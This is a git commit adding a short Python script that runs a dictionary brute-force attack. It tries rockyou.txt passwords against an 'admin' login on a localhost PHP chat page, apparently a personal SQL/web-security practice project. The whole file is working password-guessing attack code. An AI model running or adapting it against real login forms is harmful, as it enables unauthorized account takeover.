c79bac6c0c7d7b7c3b9da7fc5bccfc4e427bb09c
jimmy doussain <doxteurn@gmail.com>
2021-01-05 20:10:05 +0000

    First Commit

---
+++ python.py
@@ -0,0 +1,32 @@
+# Import request for Post Request
+import requests
+import urllib
+import re
+
+# déclaration de variable
+
+numberOfLine = 0
+# Read Line
+
+f = open("../rockyou.txt", "r")
+
+
+# Setup Link Post request
+
+url = "http://localhost/SQLlearning/MiniChat/minichat.php"
+headers = {'User-Agent': 'Mozilla/5.0'}
+userPass = {'Username': 'admin', 'Password': " "}
+session = requests.Session()
+
+# Bruteforce password one by one
+for password in f:
+    for word in password.split():
+        numberOfLine += 1
+        userPass["Password"] = word
+        result = session.post(url, headers=headers, data=userPass)
+        site = urllib.request.urlopen(result.url).read().decode()
+        myvar = site.find("hello")
+        if(myvar != -1):
+            print("Mot de passe trouvé via le dictionnaire à la position",numberOfLine)
+            print("Le mot de passe est :" , word)
+            exit()
